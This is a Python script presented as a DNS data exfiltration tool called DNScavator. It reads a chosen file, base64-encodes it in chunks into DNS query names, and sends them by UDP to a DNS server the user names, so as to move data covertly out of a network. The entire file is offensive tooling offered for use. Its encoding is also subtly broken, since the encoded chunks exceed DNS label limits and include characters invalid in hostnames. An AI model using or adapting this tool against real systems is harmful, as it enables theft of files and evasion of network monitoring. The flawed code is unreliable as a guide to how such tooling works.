import os
import socket
import base64
import time

def print_ascii_art():
    art = """
    ██████╗ ███╗   ██╗███████╗ ██████╗ █████╗ ██╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗ 
    ██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗██║   ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
    ██║  ██║██╔██╗ ██║███████╗██║     ███████║██║   ██║███████║   ██║   ██║   ██║██████╔╝
    ██║  ██║██║╚██╗██║╚════██║██║     ██╔══██║╚██╗ ██╔╝██╔══██║   ██║   ██║   ██║██╔══██╗
    ██████╔╝██║ ╚████║███████║╚██████╗██║  ██║ ╚████╔╝ ██║  ██║   ██║   ╚██████╔╝██║  ██║
    ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                
                            DNS Data Exfiltration Tool
                               Created by @4rk4n3
    """
    print(art)

# Function to split file into chunks of size 250 bytes (DNS payload size limit)
def split_file(file_path, chunk_size=250):
    with open(file_path, 'rb') as f:
        data = f.read()

    # Split the file into chunks of the specified size
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks

# Function to create DNS query header
def create_dns_query(data_chunk, domain="example.com"):
    transaction_id = 12345  # Random transaction ID
    flags = 0x0100  # Standard query
    questions = 1  # Number of questions
    answer_rrs = 0  # Number of answer resource records
    authority_rrs = 0  # Number of authority resource records
    additional_rrs = 0  # Number of additional resource records

    # DNS query header (first 12 bytes)
    header = bytearray()
    header.extend(transaction_id.to_bytes(2, byteorder='big'))  # Transaction ID
    header.extend(flags.to_bytes(2, byteorder='big'))  # Flags
    header.extend(questions.to_bytes(2, byteorder='big'))  # Questions count
    header.extend(answer_rrs.to_bytes(2, byteorder='big'))  # Answer RRs count
    header.extend(authority_rrs.to_bytes(2, byteorder='big'))  # Authority RRs count
    header.extend(additional_rrs.to_bytes(2, byteorder='big'))  # Additional RRs count

    # Convert the base64-encoded data to a subdomain
    encoded_data = base64.b64encode(data_chunk).decode()
    query_name = encoded_data + '.' + domain  # Construct the query name

    # Convert the query name to DNS format (length-prefixed labels)
    labels = query_name.split('.')
    for label in labels:
        length = len(label)
        header.append(length)  # Length of the label
        header.extend(label.encode())  # Label itself
    header.append(0)  # Null byte to end the query name (no more labels)

    # Query type (ANY)
    header.extend((255).to_bytes(2, byteorder='big'))  # Query type ANY (0xFF)
    header.extend((1).to_bytes(2, byteorder='big'))  # Query class IN (0x01)

    return header

# Function to send the DNS query over UDP
def send_dns_query(dns_server, data_chunk, domain="example.com"):
    # Create the DNS query packet
    dns_query = create_dns_query(data_chunk, domain)

    # Send the query over UDP
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(dns_query, (dns_server, 53))  # Port 53 is the DNS port
        print(f"Sent chunk to {dns_server}")
    except Exception as e:
        print(f"Error sending DNS query: {e}")
    finally:
        sock.close()

# Function to handle sending the file in chunks
def send_file(file_path, dns_server, domain="example.com"):
    chunks = split_file(file_path)

    for chunk in chunks:
        send_dns_query(dns_server, chunk, domain)
        time.sleep(1)  # Wait a little before sending the next chunk (adjust as needed)

if __name__ == "__main__":
    # Display the banner
    print_ascii_art()
    
    print("\nDNScavator - DNS Data Exfiltration Tool")
    print("----------------------------------------\n")
    
    # Prompt user for file path and DNS server IP address
    file_path = input("Enter the path to the file you want to send: ").strip()
    dns_server = input("Enter the IP address of the DNS server to send data to: ").strip()

    # Check if the file exists
    if not os.path.isfile(file_path):
        print(f"Error: The file '{file_path}' does not exist.")
    else:
        print(f"\nStarting data exfiltration...")
        print(f"File: {file_path}")
        print(f"DNS Server: {dns_server}\n")
        send_file(file_path, dns_server)
        print("\nData exfiltration complete!")
